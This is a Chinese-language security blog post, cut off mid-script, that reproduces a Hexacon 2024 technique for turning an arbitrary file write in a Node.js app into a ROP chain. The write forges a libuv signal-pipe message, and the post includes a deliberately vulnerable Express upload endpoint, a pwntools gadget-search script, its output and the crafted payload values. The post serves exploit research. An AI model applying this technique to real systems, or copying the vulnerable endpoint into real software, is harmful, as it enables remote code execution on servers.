<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="Exploiting File Writes in Hardened Node.js Environments">
<meta property="og:url" content="https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-8778bac7cf173f318f9bdaef3b13b42f-071cd9.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-4e4c234c729552c4f80708a0cac752c5-e50925.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-cf8fb6fb7066bc34ccb97064a70b18fc-d7be53.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-0451221f0f0d61a455ffd02befc66f4d-5cee2b.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-e9f2be9985bd6dab1346e6fa1a9a0799-67170b.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-6bf3771aad3b40b87f9b4efc55d206c2-c68607.png">
<meta property="article:published_time" content="2024-10-15T10:23:33.000Z">
<meta property="article:modified_time" content="2024-10-21T08:06:42.000Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="nodejs">
<meta property="article:tag" content="libuv">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-8778bac7cf173f318f9bdaef3b13b42f-071cd9.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Exploiting File Writes in Hardened Node.js Environments</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/RWCTF-6th-Router4-Writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&text=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&is_video=false&description=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Exploiting File Writes in Hardened Node.js Environments&body=Check out this article: https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&name=Exploiting File Writes in Hardened Node.js Environments&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&t=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL; DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-Data-Structure"><span class="toc-number">3.1.</span> <span class="toc-text">Overview Data Structure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Searching-Data-Structure-Gadgets"><span class="toc-number">3.2.</span> <span class="toc-text">Searching Data Structure Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-Chain"><span class="toc-number">3.3.</span> <span class="toc-text">ROP Chain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">4.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Exploiting File Writes in Hardened Node.js Environments
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-15T10:23:33.000Z" itemprop="datePublished">2024-10-15</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/libuv/" rel="tag">libuv</a>, <a class="tag-link-link" href="/tags/nodejs/" rel="tag">nodejs</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>在 Hexacon 2024 上关注到了这么一个议题 《Exploiting File Writes in Hardened Environments - From HTTP Request to ROP Chain in Node.js 》， 同时该作者发了一个简单的 Blog 讲述了下这个原理以及部分细节。<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/ 
">[1]</span></a></sup>  这里简单快速复现一下。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">const express &#x3D; require(&#39;express&#39;);</span><br><span class="line">const fs &#x3D; require(&#39;fs&#39;);</span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line">const app &#x3D; express();</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.post(&#39;&#x2F;upload&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">  const &#123; filename, content &#125; &#x3D; req.body;</span><br><span class="line"></span><br><span class="line">  if (!filename || !content) &#123;</span><br><span class="line">    return res.status(400).json(&#123; message: &#39;Filename and content are required!&#39; &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const filePath &#x3D; path.join(__dirname, &#39;uploads&#39;, filename);</span><br><span class="line"></span><br><span class="line">  fs.writeFile(filePath, content, (err) &#x3D;&gt; &#123;</span><br><span class="line">    if (err) &#123;</span><br><span class="line">      return res.status(500).json(&#123; message: &#39;Error saving file!&#39; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.json(&#123; message: &#39;File uploaded successfully!&#39;, path: filePath &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, () &#x3D;&gt; &#123;</span><br><span class="line">  console.log(&#39;Server running on http:&#x2F;&#x2F;localhost:3000&#39;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>按照文章的描述， 我们先随便构造一个可以任意文件写的 nodejs 服务 （在假设环境是readonly 的情况下）</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>按照文章的描述， nodejs 使用了 <code>libuv</code> 的这么一个库， 这个库在初始化的时候会的打开一个 Pipe 管道， 作者通过审计的时候发现有一个函数 <code>uv__signal_event</code> <sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://github.com/libuv/libuv/blob/fbe2d85bd5a5c370a8cacea92b3bdfbd9f98a530/src/unix/signal.c#L433">[2]</span></a></sup></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">uv__signal_event</span><span class="params">(<span class="keyword">uv_loop_t</span>* loop,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uv__io_t</span>* w,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">int</span> events)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uv__signal_msg_t</span>* msg;</span><br><span class="line">  <span class="keyword">uv_signal_t</span>* handle;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(<span class="keyword">uv__signal_msg_t</span>) * <span class="number">32</span>];</span><br><span class="line">  <span class="keyword">size_t</span> bytes, end, i;</span><br><span class="line">  <span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line">  bytes = <span class="number">0</span>;</span><br><span class="line">  end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    r = read(loop-&gt;signal_pipefd[<span class="number">0</span>], buf + bytes, <span class="keyword">sizeof</span>(buf) - bytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r == <span class="number">-1</span> &amp;&amp; errno == EINTR)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">		...</span><br><span class="line">    <span class="comment">/* `end` is rounded down to a multiple of sizeof(uv__signal_msg_t). */</span></span><br><span class="line">    end = (bytes / <span class="keyword">sizeof</span>(<span class="keyword">uv__signal_msg_t</span>)) * <span class="keyword">sizeof</span>(<span class="keyword">uv__signal_msg_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; end; i += <span class="keyword">sizeof</span>(<span class="keyword">uv__signal_msg_t</span>)) &#123;</span><br><span class="line">      msg = (<span class="keyword">uv__signal_msg_t</span>*) (buf + i);</span><br><span class="line">      handle = msg-&gt;handle;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (msg-&gt;signum == handle-&gt;signum) &#123;</span><br><span class="line">        assert(!(handle-&gt;flags &amp; UV_HANDLE_CLOSING));</span><br><span class="line">        handle-&gt;signal_cb(handle, handle-&gt;signum); <span class="comment">// callback</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      handle-&gt;dispatched_signals++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (handle-&gt;flags &amp; UV_SIGNAL_ONE_SHOT)</span><br><span class="line">        uv__signal_stop(handle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个函数中， 从 <code>loop-&gt;signal_pipefd[0]</code> 读内容， 然后做一个 signum检查， 就会使用传过来的数据解引用出来一个函数指针，然后直接调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handle = msg-&gt;handle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msg-&gt;signum == handle-&gt;signum) &#123;</span><br><span class="line">  assert(!(handle-&gt;flags &amp; UV_HANDLE_CLOSING));</span><br><span class="line">  handle-&gt;signal_cb(handle, handle-&gt;signum); <span class="comment">// callback</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>uv__signal_msg_t数据结构仅包含两个成员，一个句柄指针和一个称为signum的整数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">uv_signal_t</span>* handle;</span><br><span class="line">  <span class="keyword">int</span> signum;</span><br><span class="line">&#125; <span class="keyword">uv__signal_msg_t</span>;</span><br></pre></td></tr></table></figure>

<p>在这个 Pipe 是可 <code>uv__make_pipe</code> 函数创建的， 在 Docker 容器中是fd 为 11 的描述符</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-8778bac7cf173f318f9bdaef3b13b42f-071cd9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-8778bac7cf173f318f9bdaef3b13b42f-071cd9.png" alt="image.png"></a></p>
<p>当然这个fd num 值更好的判断就是下一个断点， 然后简单通过 echo 发点数据就能确认 （ 不要在真实机器上测试， 会把一些 lib 写坏掉）</p>
<h3 id="Overview-Data-Structure"><a href="#Overview-Data-Structure" class="headerlink" title="Overview Data Structure"></a>Overview Data Structure</h3><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-4e4c234c729552c4f80708a0cac752c5-e50925.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-4e4c234c729552c4f80708a0cac752c5-e50925.png" alt="image.png"></a></p>
<p>对于我们来说， 我们有一个任意文件写入的方法， 我们通过这个方法往 Pipe 中写入我们构造的数据， 我们要构造的数据如上</p>
<p>发送过来的数据包含两个部分， 一个是 <code>*handle</code> 指针， 和 <code>signum</code>， 其中 <code>*handle</code> 指针指向的数据包含两个部分</p>
<ul>
<li><code>signal_cb</code></li>
<li><code>signum</code></li>
</ul>
<p>我们要构造 <code>uv_signal_msg_t</code> 的 <code>signum</code> 和 <code>uv_signal_s</code> 结构体中的 <code>signum</code> 相等， 才会调用 <code>signal_cb</code>  ， 并且， 由于我们构造的这个场景是通过 <code>fs.writeFile</code> 函数写入内容的</p>
<blockquote>
<p>用于写入文件的函数（本例中为 fs.writeFile）仅限于有效的 UTF-8 数据。因此，写入管道的所有数据都必须是有效的 UTF-8。</p>
</blockquote>
<p>如果满足上述条件， 我们就可以劫持程序流，控制程序执行到我们想要的地方</p>
<h3 id="Searching-Data-Structure-Gadgets"><a href="#Searching-Data-Structure-Gadgets" class="headerlink" title="Searching Data Structure Gadgets"></a>Searching Data Structure Gadgets</h3><p>由于  <code>FROM node:18@sha256:f910225c96b0f77b0149f350a3184568a9ba6cddba2a7c7805cc125a50591605</code> 我们这个方式拉取的 node 程序本身是没有开PIE的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">osboxes@osboxes:~$ checksec node</span><br><span class="line">[*] <span class="string">&#x27;/home/osboxes/node&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>因此我们可以尝试在 node 程序中尝试找合适的 gadget。 我考虑到如果程序起来只有可能会有一些数据写在 bss 或者 data 段上， 因此我 search 的范围是将程序正常启动，然后 dump memory</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-cf8fb6fb7066bc34ccb97064a70b18fc-d7be53.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-cf8fb6fb7066bc34ccb97064a70b18fc-d7be53.png" alt="image.png"></a></p>
<p>由于执行到 <code>signal_cb</code> 的时候， 此时场景如下：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-0451221f0f0d61a455ffd02befc66f4d-5cee2b.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-0451221f0f0d61a455ffd02befc66f4d-5cee2b.png" alt="image.png"></a></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-e9f2be9985bd6dab1346e6fa1a9a0799-67170b.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-e9f2be9985bd6dab1346e6fa1a9a0799-67170b.png" alt="image.png"></a></p>
<p>我们仅仅需要找几个 <code>pop xxx , pop xxx, .* ret</code> 的 gadget 就行， 那么代码思路如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> addr, length <span class="keyword">in</span> segments:</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">4</span>):</span><br><span class="line">        handle = addr + offset</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(p64(handle-<span class="number">0x60</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        signum = read_mem(handle+<span class="number">8</span>, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(signum):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ptr = read_mem(handle, <span class="number">8</span>)</span><br><span class="line">        data = read_mem(u64(ptr), <span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        out =  disasm(data, arch=<span class="string">&#x27;amd64&#x27;</span>, byte=<span class="literal">False</span>, offset=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> is_useful_gadget(out):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;handle&#x27;</span>,<span class="built_in">hex</span>(handle), <span class="string">&#x27;-&gt;&#x27;</span>, <span class="string">&#x27;ptr:&#x27;</span>, u64(ptr), <span class="string">&#x27;signum&#x27;</span>, <span class="built_in">hex</span>(u32(signum)))</span><br><span class="line">            <span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure>

<p>首先从头开始遍历， 由于调用的callback 指针是从 <code>handle+60h</code> 获取的， 因此我们第一个要校验的 <code>*handle</code> 是要减去 0x60 的， 然后从 <code>handle + 8 </code> 后取 4个字节， 作为signum ，判断这两者是否都符合 utf-8 编码， 如果是将这个指针读出来， 接着读取这个指针的指向的gadget ， 这里假设 depth 为 30 ， 然后尝试去反汇编， 然后判断这个 gadget 是不是符合 <code>pop xxx , ret</code> 的形式， 如果是将这些值打印出来。</p>
<p>我这里没有做更细致的处理，打印出来的 gadget  可能比较丑， 大概长这样</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-6bf3771aad3b40b87f9b4efc55d206c2-c68607.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-6bf3771aad3b40b87f9b4efc55d206c2-c68607.png" alt="image.png"></a></p>
<p>很幸运的是， 我的第一个 gadget 就是满足的， 且适合我用来做栈迁移的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@osboxes:/home/osboxes<span class="comment"># python3 search.py</span></span><br><span class="line">handle 0x4261af -&gt; ptr: 12048128(0xB7D700) signum 0xb7d900</span><br><span class="line">pop    r12</span><br><span class="line">pop    r13</span><br><span class="line">pop    r14</span><br><span class="line">pop    r15</span><br><span class="line">pop    rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>那么此时我构造出来的数据就大致长这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uv_signal_msg_t.               </span><br><span class="line">          	....</span><br><span class="line">*handle (0x4261af) --------&gt;   uv_signal_s</span><br><span class="line"> signum (0xb7d900).               ...</span><br><span class="line"></span><br><span class="line">                               *signal_cb(0xB7D700) : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">                               signum (0xb7d900)</span><br><span class="line">                                 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content   = p64(<span class="number">0x4261af</span> - <span class="number">0x60</span>)  <span class="comment"># handle</span></span><br><span class="line">content  += p64(<span class="number">0xb7d900</span>)         <span class="comment"># signum</span></span><br></pre></td></tr></table></figure>


<p>这里贴下我完整的 search 脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_utf8</span>(<span class="params">byte_seq</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        byte_seq.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mem</span>(<span class="params">addr, size</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x0000000000400000</span>&lt; addr&lt; <span class="number">0x0000000004ff1000</span>:</span><br><span class="line">        base = <span class="number">0x0000000000400000</span></span><br><span class="line">        data = mem1[addr-base: addr+size-base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x00000000051f1000</span> &lt; addr &lt; <span class="number">0x00000000051f4000</span>:</span><br><span class="line">        base = <span class="number">0x00000000051f1000</span></span><br><span class="line">        data = mem2[addr-base: addr+size-base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x00000000051f4000</span> &lt; addr &lt; <span class="number">0x000000000520f000</span>:</span><br><span class="line">        base = <span class="number">0x00000000051f4000</span></span><br><span class="line">        data = mem3[addr-base: addr+size-base]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> 